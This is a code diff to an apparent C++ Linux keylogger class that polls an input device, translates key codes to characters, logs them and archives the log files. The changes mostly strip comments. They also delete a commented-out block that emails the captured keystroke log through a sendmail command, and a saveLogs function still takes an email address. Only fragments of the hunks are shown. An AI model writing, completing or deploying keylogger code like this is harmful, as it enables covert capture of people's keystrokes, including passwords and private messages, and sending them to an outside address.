@@ -12,7 +12,6 @@ void Log::printEventData(struct input_event ev) {
     std::cout << "\nTime: " << asctime(localtime(ptrTime)) << "Code: " << ev.code;
     if (ev.type == 1) std::cout << "  Translated: " << getChar(ev.code);
     std::cout << "  Type: " << ev.type; 
-    //std::cout << "\nValue:\t" << ev.value << std::endl;
 }
 
 void Log::processEvent(struct input_event ev, int fd) {
@@ -45,14 +44,14 @@ void Log::readFile() {
         error("Reading files", 1);
     }
 
-    fds[0].events = POLLIN; // POLL IN, poller cares about input events
+    fds[0].events = POLLIN; // input events
     
     int exitKeyPressCount = 50; // key events to read
     
     while(1) {
         
         // poll waits for the file to be ready to be read
-        event = poll(fds, 1, 5000); // 5000ms till timeout
+        event = poll(fds, 1, 5000); 
         
         // event less than or equal to 0 is a timeout
         if (event > 0) {
@@ -135,20 +134,8 @@ void Log::saveLogs(std::string fn, std::string email) {
 
     }
 
-    // now file should be read
     // truncate keylogger
     if (ftruncate(rfd, 0) != 0) error("Truncating read file", 1);
-
-    // send copied file over email
-    /*
-    char command[100], to[] = "email@gmail.com", fileName = "log.txt";
-
-    sprintf(cmd, "sendmail %s < %s", to, fileName);
-    exec(cmd);
-    */
-    
-    // delete copied file
-    //if (remove(wfd) != 0) error("Deleting copied file", 1);
     
     // archieve copied file
     if (!archieveCount) archieveCount = 0;
